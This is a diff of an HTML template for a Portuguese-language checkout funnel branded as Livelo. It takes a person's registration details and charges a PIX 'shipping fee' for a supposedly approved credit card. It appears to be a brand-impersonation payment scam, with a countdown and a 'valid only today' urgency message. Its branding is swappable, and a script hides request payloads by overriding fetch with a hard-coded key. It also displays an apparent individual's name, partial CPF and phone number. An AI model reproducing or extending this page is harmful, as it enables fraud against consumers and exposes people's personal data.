+<span style="color:#1A1A1A;font-weight:600">PRAZO ESTIMADO</span><br/>até 3 dias úteis após aprovação<br/><br/>
+<span style="color:#1A1A1A;font-weight:600">VALOR DO FRETE</span><br/>R$ 29,90 (pagamento único)
+        </div>
+</div>
+<div style="flex:1;background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px">
+<div style="font-size:0.75rem;font-weight:700;color:var(--text);margin-bottom:8px">Dados de entrega</div>
+<div style="font-size:0.7rem;color:var(--text-muted);line-height:1.4">
+<span style="color:#1A1A1A;font-weight:600;text-transform:uppercase">NOME DO DESTINATÁRIO</span><br/><span id="sum-nome">VITOR DANIEL MUNDIM</span><br/><br/>
+<span style="color:#1A1A1A;font-weight:600;text-transform:uppercase">ENDEREÇO</span><br/><span id="sum-rua"></span><br/><br/>
+<span style="color:#1A1A1A;font-weight:600;text-transform:uppercase">BAIRRO</span><br/><span id="sum-bairro"></span>
+</div>
+</div>
+</div>
+
+
+</div>
+</div>
+<!-- ═══════ PIX (Img 3) ═══════ -->
+<div class="screen" id="screen-pix">
+<div class="step-container" style="justify-content:flex-start;min-height:90vh;max-width:480px;margin:0 auto;padding-top:20px">
+
+<!-- Stepper -->
+<div style="display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:24px;font-size:0.7rem;font-weight:600;color:var(--text-muted)">
+<div style="display:flex;align-items:center;gap:4px;color:#10B981"><div style="width:14px;height:14px;border-radius:50%;background:#10B981;color:white;display:flex;align-items:center;justify-content:center;font-size:9px">✓</div> Cadastro</div>
+<div style="width:16px;height:1px;background:#E5E7EB"></div>
+<div style="display:flex;align-items:center;gap:4px;color:#10B981"><div style="width:14px;height:14px;border-radius:50%;background:#10B981;color:white;display:flex;align-items:center;justify-content:center;font-size:9px">✓</div> Endereço</div>
+<div style="width:16px;height:1px;background:#E5E7EB"></div>
+<div style="display:flex;align-items:center;gap:4px;color:var(--pink)"><div style="width:14px;height:14px;border-radius:50%;background:var(--pink);color:white;display:flex;align-items:center;justify-content:center;font-size:9px">3</div> Pagamento</div>
+</div>
+<div style="text-align:center;margin-bottom:20px">
+<h2 style="font-size:1.1rem;margin-bottom:6px;color:#1A1A1A">Pague o frete via PIX</h2>
+<p style="font-size:0.75rem;color:var(--text-muted);margin:0">Escaneie o QR Code ou copie o código para pagar</p>
+</div>
+<div style="background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px;margin-bottom:12px;font-size:0.75rem">
+<div style="display:flex;justify-content:space-between;margin-bottom:8px">
+<span style="color:var(--text-muted)">Frete SEDEX (Expresso)</span>
+<span style="font-weight:600">R$ 29,90</span>
+</div>
+<div style="display:flex;justify-content:space-between;margin-bottom:12px;padding-bottom:12px;border-bottom:1px solid #E5E7EB">
+<span style="color:var(--text-muted)">Prazo de entrega</span>
+<span style="font-weight:600">até 3 dias úteis</span>
+</div>
+<div style="display:flex;justify-content:space-between;font-weight:700">
+<span>Total</span>
+<span style="color:var(--pink);font-size:0.9rem">R$ 29,90</span>
+</div>
+</div>
+<div style="background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px;margin-bottom:16px">
+<div style="display:flex;align-items:center;gap:6px;font-size:0.7rem;font-weight:700;color:var(--pink);margin-bottom:8px">
+<svg fill="none" height="14" viewbox="0 0 24 24" width="14"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2M12 11a4 4 0 1 0 0-8 4 4 0 0 0 0 8z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+        Dados do comprador
       </div>
-      <div id="wa-error" class="error-msg hidden"></div>
-      <button class="btn-primary" id="btn-wa-continuar" onclick="submitWhatsapp()">
-        <span id="btn-wa-text">Continuar</span>
-        <svg viewBox="0 0 24 24" fill="none" width="16" height="16" id="wa-btn-arrow"><path d="M5 12h14M13 6l6 6-6 6" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        <div id="btn-wa-spin" class="spinner hidden"></div>
+<div style="font-size:0.65rem;color:var(--text-muted);line-height:1.5;text-transform:uppercase">
+<span style="font-weight:600">NOME:</span> <span id="pix-nome">VITOR DANIEL MUNDIM</span><br/>
+<div style="display:flex;justify-content:space-between;margin-top:4px">
+<div><span style="font-weight:600">CPF:</span> <span id="pix-cpf">***.079.771-**</span></div>
+<div><span style="font-weight:600">TELEFONE:</span> <span id="pix-tel">(31) 90504-4521</span></div>
+</div>
+</div>
+</div>
+<div style="background:white;border:1px solid #10B981;border-radius:12px;padding:20px;text-align:center">
+<div style="display:flex;align-items:center;justify-content:center;gap:6px;font-size:0.85rem;font-weight:700;color:#10B981;margin-bottom:16px">
+<svg fill="none" height="16" viewbox="0 0 24 24" width="16"><rect height="18" rx="2" stroke="currentColor" stroke-width="2" width="18" x="3" y="3"></rect><path d="M8 12h8M12 8v8" stroke="currentColor" stroke-linecap="round" stroke-width="2"></path></svg>
+        Pagar com PIX
+      </div>
+<div class="qr-wrap" style="margin:0 auto 16px;background:#F9FAFB;padding:12px;border-radius:12px;display:inline-block">
+<div class="qr-loading" id="qr-loading"><div class="qr-spinner"></div><div style="font-size:0.7rem">Gerando QR Code...</div></div>
+<img alt="QR Code PIX" class="qr-image hidden" id="qr-img" src="" style="width:140px;height:140px">
+</img></div>
+<div style="background:#F9FAFB;border:1px solid #E5E7EB;border-radius:8px;padding:10px;margin-bottom:12px">
+<div style="font-size:0.65rem;color:var(--text-muted);margin-bottom:4px">Código PIX (copie e cole)</div>
+<textarea aria-label="Código PIX" id="pix-code-text" readonly="" rows="3" style="width:100%;background:transparent;border:none;font-size:0.6rem;color:#1A1A1A;resize:none;word-break:break-all;outline:none" title="Código PIX">00020126440014br.gov.bcb.pix0122teste@pix.com.br520400005303986540529.905802BR5914NOME6009SAO PAULO62070503***6304</textarea>
+</div>
+<button class="btn-copy" id="btn-copy-pix" onclick="copyPix()" style="width:100%;background:#10B981;color:white;border:none;border-radius:8px;padding:12px;font-weight:600;font-size:0.8rem;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px">
+<svg fill="none" height="16" viewbox="0 0 20 20" width="16"><rect height="11" rx="2" stroke="white" stroke-width="1.5" width="10" x="7" y="7"></rect><path d="M13 7V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h2" stroke="white" stroke-width="1.5"></path></svg>
+        Copiar código PIX
       </button>
-    </div>
-    <footer class="splash-footer" style="max-width:480px">
-      <p>Livelo | CNPJ: 12.888.241/0001-06 | © 2025</p>
-    </footer>
-  </div>
+<div class="copy-feedback hidden" id="copy-feedback" style="color:#10B981;font-size:0.7rem;margin-top:8px">Código copiado!</div>
+<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-top:16px;font-size:0.7rem;color:#F59E0B">
+<div class="spinner" style="border-width:2px;border-top-color:#F59E0B;width:12px;height:12px"></div>
+        Aguardando pagamento...
+      </div>
+</div>
+<div style="background:#FEE2E2;color:#EF4444;border-radius:8px;padding:10px;text-align:center;font-size:0.75rem;font-weight:700;margin:12px 0 24px">
+<span style="display:inline-block;margin-right:4px">⏰</span> <span id="pix-timer">07:35</span>
+<div style="font-size:0.65rem;font-weight:500;margin-top:2px">Esta oportunidade é válida apenas hoje!</div>
 </div>
 
-<!-- ═══════ PIX ═══════ -->
-<div id="screen-pix" class="screen">
-  <div class="step-container">
-    <div style="text-align:center;margin-bottom:24px">
-  {%- if sys_config and sys_config.get('system_logo_url') and 'livelo' not in sys_config.get('system_logo_url','') and 'default' not in sys_config.get('system_logo_url','') %}
-    <img src="{{ sys_config.get('system_logo_url') }}" style="height:40px" alt="Logo">
-  {%- else %}
-    <svg viewBox="0 0 130 38" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:40px;display:inline-block">
-      <path d="M8 5L3 19l5 14" stroke="#E5147A" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
-      <text x="18" y="27" font-family="Inter,sans-serif" font-weight="800" font-size="22" fill="#1A1A1A">livelo</text>
-    </svg>
-  {%- endif %}
-</div>
-    <div class="step-card">
-      <h2 class="step-title">Pagamento do Frete</h2>
-      <div class="pix-frete-value" id="pix-frete-display">R$ 19,90</div>
-      <p class="step-sub" style="margin-top:0">Para concluir a ativação, efetue o pagamento do frete via PIX.</p>
-      <div class="qr-wrap">
-        <div class="qr-loading" id="qr-loading"><div class="qr-spinner"></div><div>Gerando QR Code...</div></div>
-        <img id="qr-img" class="qr-image hidden" src="" alt="QR Code PIX"/>
-      </div>
-      <div class="pix-code-label">PIX Copia e Cola</div>
-      <div class="pix-code-box" style="margin-top:8px">
-        <textarea id="pix-code-text" class="pix-code-textarea" readonly rows="2" placeholder="Gerando código PIX..."></textarea>
-        <button class="btn-copy" id="btn-copy-pix" onclick="copyPix()">
-          <svg viewBox="0 0 20 20" fill="none" width="15" height="15"><rect x="7" y="7" width="10" height="11" rx="2" stroke="white" stroke-width="1.5"/><path d="M13 7V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h2" stroke="white" stroke-width="1.5"/></svg>
-          Copiar
-        </button>
-      </div>
-      <div id="copy-feedback" class="copy-feedback hidden">
-        <svg viewBox="0 0 16 16" fill="none" width="16" height="16"><circle cx="8" cy="8" r="7" fill="#10B981"/><path d="M5 8l2 2 4-4" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        Código copiado com sucesso!
-      </div>
-      <div class="pix-status-bar" id="pix-status-bar">
-        <div class="pix-status-dot" id="pix-status-dot"></div>
-        <span id="pix-status-text">Aguardando pagamento...</span>
-      </div>
-      <div class="pix-security">
-        <svg viewBox="0 0 20 20" fill="none" width="14" height="14"><path d="M10 2L3 6v5c0 4.17 3 7.96 7 8.93C17 19.96 20 16.17 20 12V6L10 2z" fill="#10B981" opacity="0.3" stroke="#10B981" stroke-width="1.5" stroke-linejoin="round"/><path d="M7 10l2.5 2.5L14 8" stroke="#10B981" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        <span>Ambiente seguro. Dados criptografados com TLS 1.3.</span>
-      </div>
-    </div>
-  </div>
-</div>
 
+</div>
+</div>
 <!-- ═══════ CONCLUÍDO ═══════ -->
-<div id="screen-done" class="screen">
-  <div class="step-container">
-    <div class="done-icon">
-      <svg viewBox="0 0 100 100" fill="none" width="90" height="90">
-        <circle cx="50" cy="50" r="48" fill="#E5147A" opacity="0.1"/>
-        <circle cx="50" cy="50" r="38" fill="#E5147A"/>
-        <path d="M32 50l12 12 24-24" stroke="white" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
-      </svg>
-    </div>
-    <h2 class="done-title">Pagamento Confirmado!</h2>
-    <p class="done-sub">Seu cartão Livelo está sendo processado. Em breve, um de nossos gerentes entrará em contato pelo WhatsApp para confirmar a entrega.</p>
-    <div class="done-info-box">
-      <div class="done-row"><svg viewBox="0 0 20 20" fill="none" width="16" height="16"><rect x="2" y="5" width="16" height="12" rx="2" stroke="#E5147A" stroke-width="1.5"/><path d="M6 9h8M6 13h4" stroke="#E5147A" stroke-width="1.5" stroke-linecap="round"/></svg><span>Cartão Livelo Mastercard aprovado</span></div>
-      <div class="done-row"><svg viewBox="0 0 20 20" fill="none" width="16" height="16"><circle cx="10" cy="10" r="8" stroke="#E5147A" stroke-width="1.5"/><path d="M10 6v4l3 3" stroke="#E5147A" stroke-width="1.5" stroke-linecap="round"/></svg><span>Prazo de entrega: 7 a 10 dias úteis</span></div>
-      <div class="done-row"><svg viewBox="0 0 20 20" fill="none" width="16" height="16"><path d="M10 2L3 6v5c0 4.17 3 7.96 7 8.93C17 19.96 20 16.17 20 12V6L10 2z" stroke="#E5147A" stroke-width="1.5" stroke-linejoin="round"/></svg><span>Limite aprovado: <strong id="done-limite"></strong></span></div>
-    </div>
-    <a id="btn-contact-manager" class="btn-wa-final" href="#" target="_blank">
-      <svg viewBox="0 0 24 24" fill="none" width="20" height="20"><path d="M12 2C6.48 2 2 6.48 2 12c0 1.85.5 3.6 1.37 5.1L2 22l5.07-1.34A9.93 9.93 0 0 0 12 22c5.52 0 10-4.48 10-10S17.52 2 12 2z" fill="white"/><path d="M16.5 14.5c-.3-.15-1.75-.86-2.02-.96s-.47-.15-.67.15-.77.96-.94 1.16-.35.22-.64.07a8.1 8.1 0 0 1-2.38-1.47 8.94 8.94 0 0 1-1.65-2.06c-.17-.3-.02-.46.13-.61.13-.13.3-.35.44-.52.15-.17.2-.3.3-.5.1-.2.05-.37-.02-.52s-.67-1.62-.92-2.22c-.24-.58-.49-.5-.67-.51-.17 0-.37-.02-.57-.02s-.52.07-.8.37c-.27.3-1.04 1.02-1.04 2.48s1.07 2.87 1.22 3.07c.14.2 2.1 3.2 5.08 4.49.71.3 1.26.48 1.69.62.71.22 1.36.19 1.87.12.57-.08 1.75-.72 2-1.41.24-.7.24-1.3.17-1.41-.07-.12-.27-.2-.57-.34z" fill="#25D366"/></svg>
+<div class="screen" id="screen-done">
+<div class="step-container">
+<div class="done-icon">
+<svg fill="none" height="90" viewbox="0 0 100 100" width="90">
+<circle cx="50" cy="50" fill="#E5147A" opacity="0.1" r="48"></circle>
+<circle cx="50" cy="50" fill="#E5147A" r="38"></circle>
+<path d="M32 50l12 12 24-24" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="5"></path>
+</svg>
+</div>
+<h2 class="done-title">Pagamento Confirmado!</h2>
+<p class="done-sub">Seu cartão Livelo está sendo processado. Em breve, um de nossos gerentes entrará em contato pelo WhatsApp para confirmar a entrega.</p>
+<div class="done-info-box">
+<div class="done-row"><svg fill="none" height="16" viewbox="0 0 20 20" width="16"><rect height="12" rx="2" stroke="#E5147A" stroke-width="1.5" width="16" x="2" y="5"></rect><path d="M6 9h8M6 13h4" stroke="#E5147A" stroke-linecap="round" stroke-width="1.5"></path></svg><span>Cartão Livelo Mastercard aprovado</span></div>
+<div class="done-row"><svg fill="none" height="16" viewbox="0 0 20 20" width="16"><circle cx="10" cy="10" r="8" stroke="#E5147A" stroke-width="1.5"></circle><path d="M10 6v4l3 3" stroke="#E5147A" stroke-linecap="round" stroke-width="1.5"></path></svg><span>Prazo de entrega: 7 a 10 dias úteis</span></div>
+<div class="done-row"><svg fill="none" height="16" viewbox="0 0 20 20" width="16"><path d="M10 2L3 6v5c0 4.17 3 7.96 7 8.93C17 19.96 20 16.17 20 12V6L10 2z" stroke="#E5147A" stroke-linejoin="round" stroke-width="1.5"></path></svg><span>Limite aprovado: <strong id="done-limite"></strong></span></div>
+</div>
+<a class="btn-wa-final" href="#" id="btn-contact-manager" target="_blank">
+<svg fill="none" height="20" viewbox="0 0 24 24" width="20"><path d="M12 2C6.48 2 2 6.48 2 12c0 1.85.5 3.6 1.37 5.1L2 22l5.07-1.34A9.93 9.93 0 0 0 12 22c5.52 0 10-4.48 10-10S17.52 2 12 2z" fill="white"></path><path d="M16.5 14.5c-.3-.15-1.75-.86-2.02-.96s-.47-.15-.67.15-.77.96-.94 1.16-.35.22-.64.07a8.1 8.1 0 0 1-2.38-1.47 8.94 8.94 0 0 1-1.65-2.06c-.17-.3-.02-.46.13-.61.13-.13.3-.35.44-.52.15-.17.2-.3.3-.5.1-.2.05-.37-.02-.52s-.67-1.62-.92-2.22c-.24-.58-.49-.5-.67-.51-.17 0-.37-.02-.57-.02s-.52.07-.8.37c-.27.3-1.04 1.02-1.04 2.48s1.07 2.87 1.22 3.07c.14.2 2.1 3.2 5.08 4.49.71.3 1.26.48 1.69.62.71.22 1.36.19 1.87.12.57-.08 1.75-.72 2-1.41.24-.7.24-1.3.17-1.41-.07-.12-.27-.2-.57-.34z" fill="#25D366"></path></svg>
       Falar com o Gerente no WhatsApp
     </a>
-  </div>
-</div>
 
+
+</div>
+</div>
 <script>
 const _key = "livelo_secure_key_2026";
 function encryptPayload(obj) {
@@ -622,11 +847,19 @@ function encryptedFetch(url, options) {
             options.body = JSON.stringify({ payload: encryptPayload(obj) });
         } catch(e) {}
     }
-    return fetch(url, options);
+    return window._fetch(url, options);
 }
 window._fetch = window.fetch;
 window.fetch = encryptedFetch;
 </script>
 <script src="/static/js/main.js"></script>
+
+  </main>
+  <footer class="funnel-footer" style="padding: 30px 20px; text-align: center; color: var(--text-muted); font-size: 0.85rem; width: 100%;">
+    <p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
+    <p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
+    <p>© 2026 · Todos os direitos reservados</p>
+  </footer>
+</div>
 </body>
 </html>
